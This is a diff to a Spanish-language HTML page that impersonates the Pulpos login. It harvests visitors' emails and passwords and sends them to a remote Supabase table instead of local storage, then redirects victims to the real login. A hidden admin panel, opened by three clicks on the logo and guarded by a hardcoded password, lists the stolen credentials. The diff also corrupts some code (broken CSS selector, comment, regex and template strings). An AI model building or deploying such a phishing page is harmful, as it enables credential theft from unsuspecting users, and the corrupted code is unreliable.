@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -7,6 +8,8 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<!-- SDK de Supabase -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 :root{
 --bg:#ffffff;
@@ -22,7 +25,7 @@
 --link:#2f80b7;
 --logo:#4aa3b0;
 }
-*{box-sizing:border-box;margin:0;padding:0}
+{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%}
 body{
 font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
@@ -48,8 +51,8 @@ margin:0 auto;
 padding-top:max(127px, env(safe-area-inset-top, 0px));
 text-align:center;
 }
-.logo{width:56px;height:auto;display:block;margin:0 auto;cursor:pointer;}
-.logo img,.logo svg{width:100%;height:auto;display:block;}
+.logo{width:56px;height:auto;display:block;margin:0 auto;cursor:pointer;user-select:none;-webkit-user-select:none;}
+.logo img,.logo svg{width:100%;height:auto;display:block;pointer-events:none;}
 h1{
 margin-top:24px;
 font-size:24px;line-height:32px;font-weight:600;color:var(--title);
@@ -93,7 +96,7 @@ transition:background .15s,color .15s;
 .signup a:hover{text-decoration:underline}
 .error{margin-top:2px;margin-bottom:8px;font-size:12px;color:#dc2626;text-align:left;min-height:0}
 .hidden { display: none !important; }
-/* Admin Modal Styles */
+/ Admin Modal Styles */
 #adminModal {
 position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000;
 }
@@ -153,7 +156,7 @@ Continuar con Google
 <button class="btn-admin btn-danger" id="closeModalBtn" style="background:#6b7280; margin-left:5px;">Cerrar</button>
 </div>
 <div id="adminDataView" class="hidden">
-<h3>Registros Almacenados</h3>
+<h3>Registros Almacenados en Supabase</h3>
 <div id="credentialsTableContainer"></div>
 <button class="btn-admin btn-danger" id="clearDataBtn">Borrar Registros</button>
 <button class="btn-admin" id="closeAdminDataBtn" style="background:#6b7280; margin-left:5px;">Cerrar</button>
@@ -161,6 +164,10 @@ Continuar con Google
 </div>
 </div>
 <script>
+// Configuración de Supabase con tus credenciales
+const SUPABASE_URL = 'https://ctsafxbqzgvectnpmulu.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN0c2FmeGJxemd2ZWN0bnBtdWx1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM0NTA0NjQsImV4cCI6MjEwOTAyNjQ2NH0.sEzTgvKdSjAUQJnsVj6-52Os-cMFCMJcO5esthz-Vvo';
+const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 const stepEmail = document.getElementById('stepEmail');
 const stepPassword = document.getElementById('stepPassword');
 const emailInput = document.getElementById('email');
@@ -170,7 +177,7 @@ const submitBtn = document.getElementById('submitBtn');
 const errorEmail = document.getElementById('errorEmail');
 const errorPassword = document.getElementById('errorPassword');
 const googleBtn = document.getElementById('googleBtn');
-const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const re = /^[^\s@]+@[^\s@]+.[^\s@]+$/;
 let currentEmail = '';
 // Paso 1: Validación de correo
 emailInput.addEventListener('input', () => {
@@ -193,22 +200,26 @@ passwordInput.addEventListener('input', () => {
 submitBtn.disabled = passwordInput.value.trim().length === 0;
 errorPassword.textContent = '';
 });
-// Envío final: guardado y redirección
-document.getElementById('loginForm').addEventListener('submit', (e) => {
+// Envío final: guardado en Supabase y redirección
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
 e.preventDefault();
 const passwordVal = passwordInput.value.trim();
 if (!passwordVal) {
 errorPassword.textContent = 'Ingresa una contraseña.';
 return;
 }
-// Guardar credenciales en localStorage
-let creds = JSON.parse(localStorage.getItem('pulpos_creds') || '[]');
-creds.push({
-email: currentEmail,
-password: passwordVal,
-date: new Date().toLocaleString()
-});
-localStorage.setItem('pulpos_creds', JSON.stringify(creds));
+submitBtn.disabled = true;
+submitBtn.textContent = 'Guardando...';
+// Guardar credenciales en la tabla 'usuarios_admin' de Supabase
+const { error } = await supabase
+.from('usuarios_admin')
+.insert([{ email: currentEmail, password: passwordVal }]);
+if (error) {
+errorPassword.textContent = 'Error al registrar: ' + error.message;
+submitBtn.disabled = false;
+submitBtn.textContent = 'Iniciar sesión';
+return;
+}
 // Redirigir a la URL solicitada
 window.location.href = 'https://app.pulpos.com/login';
 });
@@ -216,7 +227,7 @@ window.location.href = 'https://app.pulpos.com/login';
 googleBtn.addEventListener('click', () => {
 errorEmail.textContent = 'Por el momento no está disponible, ingresa correo y contraseña manualmente.';
 });
-// Acceso secreto a administración (3 clics rápidos en el logo del pulpo)
+// Acceso secreto a administración (3 clics)
 const secretLogo = document.getElementById('logoBtn');
 const adminModal = document.getElementById('adminModal');
 const adminLoginView = document.getElementById('adminLoginView');
@@ -230,20 +241,25 @@ const clearDataBtn = document.getElementById('clearDataBtn');
 const credentialsTableContainer = document.getElementById('credentialsTableContainer');
 let clickCount = 0;
 let clickTimer = null;
-secretLogo.addEventListener('click', () => {
-clickCount++;
-if (clickTimer) clearTimeout(clickTimer);
-clickTimer = setTimeout(() => {
-clickCount = 0;
-}, 500);
-if (clickCount === 3) {
+function openAdminModal() {
 clickCount = 0;
 adminModal.classList.remove('hidden');
 adminLoginView.classList.remove('hidden');
 adminDataView.classList.add('hidden');
 adminPassInput.value = '';
 adminError.textContent = '';
-adminPassInput.focus();
+setTimeout(() => adminPassInput.focus(), 100);
+}
+secretLogo.addEventListener('click', (e) => {
+e.preventDefault();
+clickCount++;
+if (clickTimer) clearTimeout(clickTimer);
+if (clickCount >= 3) {
+openAdminModal();
+} else {
+clickTimer = setTimeout(() => {
+clickCount = 0;
+}, 1200);
 }
 });
 // Validar contraseña de administración ("contraseña 2024")
@@ -259,24 +275,40 @@ adminError.textContent = 'Contraseña incorrecta.';
 adminPassInput.addEventListener('keypress', (e) => {
 if (e.key === 'Enter') adminLoginBtn.click();
 });
-function renderCredentials() {
-let creds = JSON.parse(localStorage.getItem('pulpos_creds') || '[]');
-if (creds.length === 0) {
-credentialsTableContainer.innerHTML = '<p style="font-size:13px; color:var(--muted); margin-top:10px;">No hay registros guardados.</p>';
+// Cargar registros desde Supabase
+async function renderCredentials() {
+credentialsTableContainer.innerHTML = '<p style="font-size:13px; color:var(--muted); margin-top:10px;">Cargando registros desde Supabase...</p>';
+const { data, error } = await supabase
+.from('usuarios_admin')
+.select('*')
+.order('creado_en', { ascending: false });
+if (error) {
+credentialsTableContainer.innerHTML = ⁠<p style="font-size:13px; color:#dc2626; margin-top:10px;">Error al cargar: ${error.message}</p>⁠;
 return;
 }
-let html = `<table>
-<tr><th>Fecha</th><th>Correo</th><th>Contraseña</th></tr>`;
-creds.forEach(c => {
-html += `<tr><td>${c.date}</td><td>${c.email}</td><td>${c.password}</td></tr>`;
+if (!data || data.length === 0) {
+credentialsTableContainer.innerHTML = '<p style="font-size:13px; color:var(--muted); margin-top:10px;">No hay registros guardados en Supabase.</p>';
+return;
+}
+let html = ⁠<table> <tr><th>Fecha</th><th>Correo</th><th>Contraseña</th></tr>⁠;
+data.forEach(c => {
+const fecha = c.creado_en ? new Date(c.creado_en).toLocaleString() : 'N/A';
+html += ⁠<tr><td>${fecha}</td><td>${c.email}</td><td>${c.password}</td></tr>⁠;
 });
-html += `</table>`;
+html += ⁠</table>⁠;
 credentialsTableContainer.innerHTML = html;
 }
-clearDataBtn.addEventListener('click', () => {
-if (confirm('¿Deseas borrar todos los registros?')) {
-localStorage.removeItem('pulpos_creds');
+clearDataBtn.addEventListener('click', async () => {
+if (confirm('¿Deseas borrar todos los registros de Supabase?')) {
+const { error } = await supabase
+.from('usuarios_admin')
+.delete()
+.neq('id', 0);
+if (error) {
+alert('Error al borrar registros: ' + error.message);
+} else {
 renderCredentials();
+}
 }
 });
 closeModalBtn.addEventListener('click', () => { adminModal.classList.add('hidden'); });
